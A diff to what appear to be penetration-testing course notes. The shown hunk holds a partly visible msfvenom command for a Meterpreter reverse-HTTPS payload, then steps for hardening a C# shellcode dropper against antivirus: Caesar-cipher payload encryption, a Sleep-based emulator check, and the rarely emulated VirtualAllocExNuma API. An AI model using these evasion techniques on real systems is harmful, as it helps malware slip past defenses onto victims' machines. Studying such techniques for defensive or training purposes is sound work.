@@ -58,4 +58,12 @@ kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP POR
 ```
 
 ## Play with C#
-Let's modify this [banana C# payload dropper](/03ProcessInjectionMigration/Program.cs) to make it stronger and better. 
+Let's modify this [banana C# payload dropper](/02ClientSideWithWindowsScriptHost/Class1.cs) to make it stronger and better.
+- 1. We can use [Caeasr Ciper code](/04FunWithAntivirus/Caesar.cs) to encrpt our payload, and add encypted payload to our beefy c# dropper, we add a decryption routine to get our old payload before load into memory. 
+- 2.Let's mess with our code behavior a bit to bypass heuristic detection techniques. We can add a Sleep timer with Win32 Sleep API.If this section of code is being
+simulated, the emulator will detect the Sleep call and fast-forward through the instruction. we can inject a two-second delay, and if the time checks indicate that two seconds have not passed during the instruction, we assume we are running in a simulator and can simply reutrn the code.
+- 3.using non-emulated APIs,  antivirus emulators are cheap too, they often only simulate the execution of common exe or functions. We could bypass this by using a WinAPI that is not emulated. For example, [Win32 VirtualAllocExNuma](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma) a uncommon API, with Numa suffix, a system design to optimize memory usage on multi-processor servers. We can test this by reverse engineering the antivirus emulator, or test out various APIs against AV engine. let's use VirtualAllocExNuma instead of VirtualAllocEx to allocated memory, and we can put a check block, return code if the memeory is not allocated.
+- 4.After adding those 3 ttps, this is our [beefy C# dropper](/04FunWithAntivirus/beefyC#dropper.cs)
+- 5.TODO, reseach more uncommon API, lookinto Win32 FlsAlloc.(page 185)
+
+## Play with VBA for a beefy Marco(page 190)
